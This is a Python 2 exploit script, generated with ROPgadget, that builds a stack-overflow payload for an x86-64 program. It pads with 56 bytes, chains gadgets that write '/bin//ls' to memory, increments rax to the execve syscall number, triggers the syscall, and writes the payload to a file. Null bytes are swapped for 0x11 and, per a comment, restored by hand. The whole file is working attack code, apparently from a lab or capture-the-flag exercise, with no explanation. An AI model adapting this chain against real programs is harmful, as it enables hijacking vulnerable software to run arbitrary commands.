#!/usr/bin/env python2
# execve generated by ROPgadget
import sys
# sys.setdefaultencoding() does not exist, here!
reload(sys)  # Reload does the trick!
sys.setdefaultencoding('latin-1')

from struct import pack

# Padding goes here
p = ''

# !!!!!!!!!!!!!!!!!!!!!!!!! IMPORTANT !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
# I've replaced all \x00 in the payload to \x11 due to python
# ignoring the \x00s when writing it into the payload file
# I later change these values to \x00 using ghex after the script runs
# !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

p += pack('<Q', 0x1111111111409ede) # pop rsi ; ret
p += pack('<Q', 0x11111111114c50e0) # @ .data
p += pack('<Q', 0x111111111144fc87) # pop rax ; ret
p += '/bin//ls'
p += pack('<Q', 0x11111111114523f5) # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x1111111111409ede) # pop rsi ; ret
p += pack('<Q', 0x11111111114c50e8) # @ .data + 8
p += pack('<Q', 0x111111111143e9d9) # xor rax, rax ; ret
p += pack('<Q', 0x11111111114523f5) # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x1111111111401e6f) # pop rdi ; ret
p += pack('<Q', 0x11111111114c50e0) # @ .data
p += pack('<Q', 0x1111111111409ede) # pop rsi ; ret
p += pack('<Q', 0x11111111114c50e8) # @ .data + 8
p += pack('<Q', 0x1111111111485a0b) # pop rdx ; pop rbx ; ret
p += pack('<Q', 0x11111111114c50e8) # @ .data + 8
p += pack('<Q', 0x4141414141414141) # padding
p += pack('<Q', 0x111111111143e9d9) # xor rax, rax ; ret
p += pack('<Q', 0x11111111114780d0) # add rax, 1 ; ret
p += pack('<Q', 0x11111111114780d0) # add rax, 1 ; ret
p += pack('<Q', 0x11111111114780d0) # add rax, 1 ; ret
p += pack('<Q', 0x11111111114780d0) # add rax, 1 ; ret
p += pack('<Q', 0x11111111114780d0) # add rax, 1 ; ret
p += pack('<Q', 0x11111111114780d0) # add rax, 1 ; ret
p += pack('<Q', 0x11111111114780d0) # add rax, 1 ; ret
p += pack('<Q', 0x11111111114780d0) # add rax, 1 ; ret
p += pack('<Q', 0x11111111114780d0) # add rax, 1 ; ret
p += pack('<Q', 0x11111111114780d0) # add rax, 1 ; ret
p += pack('<Q', 0x11111111114780d0) # add rax, 1 ; ret
p += pack('<Q', 0x11111111114780d0) # add rax, 1 ; ret
p += pack('<Q', 0x11111111114780d0) # add rax, 1 ; ret
p += pack('<Q', 0x11111111114780d0) # add rax, 1 ; ret
p += pack('<Q', 0x11111111114780d0) # add rax, 1 ; ret
p += pack('<Q', 0x11111111114780d0) # add rax, 1 ; ret
p += pack('<Q', 0x11111111114780d0) # add rax, 1 ; ret
p += pack('<Q', 0x11111111114780d0) # add rax, 1 ; ret
p += pack('<Q', 0x11111111114780d0) # add rax, 1 ; ret
p += pack('<Q', 0x11111111114780d0) # add rax, 1 ; ret
p += pack('<Q', 0x11111111114780d0) # add rax, 1 ; ret
p += pack('<Q', 0x11111111114780d0) # add rax, 1 ; ret
p += pack('<Q', 0x11111111114780d0) # add rax, 1 ; ret
p += pack('<Q', 0x11111111114780d0) # add rax, 1 ; ret
p += pack('<Q', 0x11111111114780d0) # add rax, 1 ; ret
p += pack('<Q', 0x11111111114780d0) # add rax, 1 ; ret
p += pack('<Q', 0x11111111114780d0) # add rax, 1 ; ret
p += pack('<Q', 0x11111111114780d0) # add rax, 1 ; ret
p += pack('<Q', 0x11111111114780d0) # add rax, 1 ; ret
p += pack('<Q', 0x11111111114780d0) # add rax, 1 ; ret
p += pack('<Q', 0x11111111114780d0) # add rax, 1 ; ret
p += pack('<Q', 0x11111111114780d0) # add rax, 1 ; ret
p += pack('<Q', 0x11111111114780d0) # add rax, 1 ; ret
p += pack('<Q', 0x11111111114780d0) # add rax, 1 ; ret
p += pack('<Q', 0x11111111114780d0) # add rax, 1 ; ret
p += pack('<Q', 0x11111111114780d0) # add rax, 1 ; ret
p += pack('<Q', 0x11111111114780d0) # add rax, 1 ; ret
p += pack('<Q', 0x11111111114780d0) # add rax, 1 ; ret
p += pack('<Q', 0x11111111114780d0) # add rax, 1 ; ret
p += pack('<Q', 0x11111111114780d0) # add rax, 1 ; ret
p += pack('<Q', 0x11111111114780d0) # add rax, 1 ; ret
p += pack('<Q', 0x11111111114780d0) # add rax, 1 ; ret
p += pack('<Q', 0x11111111114780d0) # add rax, 1 ; ret
p += pack('<Q', 0x11111111114780d0) # add rax, 1 ; ret
p += pack('<Q', 0x11111111114780d0) # add rax, 1 ; ret
p += pack('<Q', 0x11111111114780d0) # add rax, 1 ; ret
p += pack('<Q', 0x11111111114780d0) # add rax, 1 ; ret
p += pack('<Q', 0x11111111114780d0) # add rax, 1 ; ret
p += pack('<Q', 0x11111111114780d0) # add rax, 1 ; ret
p += pack('<Q', 0x11111111114780d0) # add rax, 1 ; ret
p += pack('<Q', 0x11111111114780d0) # add rax, 1 ; ret
p += pack('<Q', 0x11111111114780d0) # add rax, 1 ; ret
p += pack('<Q', 0x11111111114780d0) # add rax, 1 ; ret
p += pack('<Q', 0x11111111114780d0) # add rax, 1 ; ret
p += pack('<Q', 0x11111111114780d0) # add rax, 1 ; ret
p += pack('<Q', 0x11111111114780d0) # add rax, 1 ; ret
p += pack('<Q', 0x11111111114780d0) # add rax, 1 ; ret
p += pack('<Q', 0x11111111114780d0) # add rax, 1 ; ret
p += pack('<Q', 0x11111111114780d0) # add rax, 1 ; ret
p += pack('<Q', 0x1111111111401c24) # syscall

payload = "A"*56 + p
payload = payload.ljust(1000, "\x11")

f = open("payload_execve.txt", "w")
f.write(payload)

